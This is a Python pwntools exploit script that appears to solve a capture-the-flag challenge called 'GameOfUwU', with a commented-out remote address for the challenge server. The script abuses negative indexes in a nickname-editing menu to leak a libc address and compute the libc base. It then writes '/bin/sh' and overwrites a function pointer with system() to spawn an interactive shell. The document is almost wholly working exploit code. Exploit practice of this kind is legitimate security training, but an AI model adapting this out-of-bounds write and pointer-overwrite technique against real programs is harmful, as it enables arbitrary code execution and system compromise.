from pwn import * 

context.log_level = 'debug'

    

def edit_nickname(p, index):
    p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
    p.sendline(b"3")

    p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
    print(str(index).encode())
    p.sendline(str(index).encode())

def new_name(p, name):
    p.recvuntil(b"What is its new nickname? \n  ")
    p.sendline(name)
    

def exploit():

    p = process('./GameOfUwU_noclear_patched') 
    libc = ELF('./libc.so.6')
    #p = remote("chal.firebird.sh", 35029)
    s = '''
    b * edit_nickname+70
    b * meun+267
    '''
    #gdb.attach(p, s)
    p.sendline("1")

    edit_nickname(p, "-2")
    p.recvuntil("name to ")

    leak = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))
    libc.address = leak - libc.sym['rand']


    new_name(p, p64(leak))
    edit_nickname(p, "1")
    new_name(p, b"/bin/sh\x00")
    
    edit_nickname(p, -7)
    
    new_name(p, b"AAAAAAAA" + p64(libc.sym['system']))
    sleep(1)
    #edit_nickname(p, "1")
    p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
    p.sendline("1")
    new_name(p, b"1")
    p.interactive()
if __name__ == "__main__":
    exploit()
